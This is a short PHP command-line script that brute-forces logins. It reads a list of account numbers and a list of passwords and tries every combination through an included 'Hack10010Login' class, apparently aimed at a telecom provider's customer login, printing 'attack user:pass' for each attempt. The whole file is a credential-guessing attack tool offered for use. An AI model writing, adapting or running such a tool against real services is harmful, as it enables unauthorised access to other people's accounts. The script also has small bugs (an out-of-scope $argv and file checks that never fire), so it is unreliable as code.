#!/usr/local/bin/php
<?php

require_once 'Hack10010Login.php';



function read_file(&$arr, $file)
{
    $h = fopen($file, "r");
    while (($buffer = fgets($h, 4096)) !== false) {
        array_push($arr, trim($buffer));
    }
    fclose($h);
}

function usage()
{
    printf("Usage:\n");
    printf("        %s  num_file  pass_file\n", $argv[0]);
    exit(1);
}

function attack($user, $pass)
{

    printf("attack %s:%s\n", $user, $pass);
    Hack10010Login::checkpass( $user, $pass);

}

if (sizeof($argv) != 3) {
    usage();
}
$user_array = array();
$pass_array = array();

if (read_file($user_array, $argv[1])) {
    usage();
}

if (read_file($pass_array, $argv[2])) {
    usage();
}

/*
var_dump($user_array);
var_dump($pass_array);
*/

foreach ($user_array as $u) {
    foreach ($pass_array as $p) {
        attack($u, $p);
    }
}

